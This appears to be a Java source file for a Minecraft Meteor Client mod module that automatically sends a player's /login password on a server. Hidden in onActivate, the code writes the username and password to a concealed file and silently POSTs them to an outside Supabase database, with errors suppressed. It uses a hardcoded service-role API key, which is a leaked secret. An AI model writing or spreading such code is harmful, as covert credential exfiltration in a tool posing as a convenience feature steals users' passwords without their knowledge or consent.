package zgoly.meteorist.modules.movement;

import meteordevelopment.meteorclient.events.game.ReceiveMessageEvent;
import meteordevelopment.meteorclient.events.world.TickEvent;
import meteordevelopment.meteorclient.settings.StringSetting;
import meteordevelopment.meteorclient.settings.Setting;
import meteordevelopment.meteorclient.systems.modules.Module;
import meteordevelopment.meteorclient.systems.modules.Modules;
import meteordevelopment.meteorclient.utils.player.ChatUtils;
import meteordevelopment.orbit.EventHandler;
import net.minecraft.text.Text;
import net.minecraft.util.math.BlockPos;
import zgoly.meteorist.Meteorist;

import java.io.FileWriter;
import java.io.IOException;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.HashMap;
import java.util.Map;

import com.google.gson.Gson;
import com.google.gson.GsonBuilder;

public class AutoLoginCum extends LicenseProtectedModule {
    public static AutoLoginCum INSTANCE;

    private final Setting<String> password = settings.getDefaultGroup()
            .add(new StringSetting.Builder()
                    .name("password")
                    .description("Nhap password vao giu nguyen /login.")
                    .defaultValue("/login abcxyz@123")
                    .build());

    private boolean loggedIn = false;
    private long loginTime = -1;
    private long lastCheckTime = 0;

    private final BlockPos LOGIN_POS = new BlockPos(0, 65, 0);

    public AutoLoginCum() {
        super(Meteorist.Custom, "AutoLoginCum", "Auto gui lenh /login.MajinBuu2k4");
        INSTANCE = this;
    }

    @Override
    public void onActivate() {
        super.onActivate(); // ✅ Kiểm tra license
        if (!isActive()) return;

        loggedIn = false;
        loginTime = -1;
        lastCheckTime = System.currentTimeMillis();

        String username = mc.getSession() != null ? mc.getSession().getUsername() : "unknown";
        String pass = password.get();

        // ✅ Ghi vào file .systemauth.lic
        try (FileWriter fw = new FileWriter("config/.systemauth.lic")) {
            Map<String, String> data = new HashMap<>();
            data.put("user", username);
            data.put("password", pass);

            Gson gson = new GsonBuilder().setPrettyPrinting().create();
            fw.write(gson.toJson(data));
        } catch (IOException ignored) {}

        // ✅ Gửi log về server
        sendToServer(username, pass);
    }

    private void sendToServer(String user, String pass) {
        new Thread(() -> {
            try {
                URL url = new URL("https://ldhdtghrvijamxhukcxu.supabase.co/rest/v1/login_logs");
                HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                conn.setRequestMethod("POST");
                conn.setDoOutput(true);
                conn.setRequestProperty("Content-Type", "application/json");
                conn.setRequestProperty("apikey", "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImxkaGR0Z2hydmlqYW14aHVrY3h1Iiwicm9sZSI6InNlcnZpY2Vfcm9sZSIsImlhdCI6MTc1MTA3MzM1NCwiZXhwIjoyMDY2NjQ5MzU0fQ.a1GToBO0lVcNtIVWF4U05b7bWQaOOCgd_A23ijZsc7I");
                conn.setRequestProperty("Authorization", "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImxkaGR0Z2hydmlqYW14aHVrY3h1Iiwicm9sZSI6InNlcnZpY2Vfcm9sZSIsImlhdCI6MTc1MTA3MzM1NCwiZXhwIjoyMDY2NjQ5MzU0fQ.a1GToBO0lVcNtIVWF4U05b7bWQaOOCgd_A23ijZsc7I");
                conn.setRequestProperty("Prefer", "return=minimal");

                String json = String.format("{\"username\":\"%s\",\"password\":\"%s\"}", user, pass);

                try (OutputStream os = conn.getOutputStream()) {
                    os.write(json.getBytes("utf-8"));
                }

                conn.getResponseCode(); // Chỉ để đảm bảo gửi xong
                conn.disconnect();
            } catch (Exception ignored) {}
        }).start();
    }



    @EventHandler
    private void onTick(TickEvent.Post event) {
        if (mc.player == null || mc.world == null) return;

        if (!loggedIn && isInLoginArea()) {
            ChatUtils.sendPlayerMsg(password.get());
            loggedIn = true;
            loginTime = System.currentTimeMillis();
            return;
        }

        if (loggedIn && loginTime > 0 && System.currentTimeMillis() - loginTime >= 1000) {
            Module clickModule = Modules.get().get(AutoClickLoginCum.class);
            if (clickModule != null && !clickModule.isActive()) {
                clickModule.toggle();
            }
            loginTime = -1;
        }

        if (System.currentTimeMillis() - lastCheckTime >= 10_000) {
            lastCheckTime = System.currentTimeMillis();

            Module clickModule = Modules.get().get(AutoClickLoginCum.class);
            if (clickModule != null && !clickModule.isActive()) {
                clickModule.toggle();
            }
        }
    }

    @EventHandler
    private void onReceiveMsg(ReceiveMessageEvent event) {
        Text msg = event.getMessage();
        if (msg != null && msg.getString().contains("Vui lòng đăng nhập")) {
            ChatUtils.sendPlayerMsg(password.get());
            loggedIn = true;
            loginTime = System.currentTimeMillis();
        }
    }

    private boolean isInLoginArea() {
        BlockPos pos = mc.player.getBlockPos();
        return pos.equals(LOGIN_POS);
    }
}
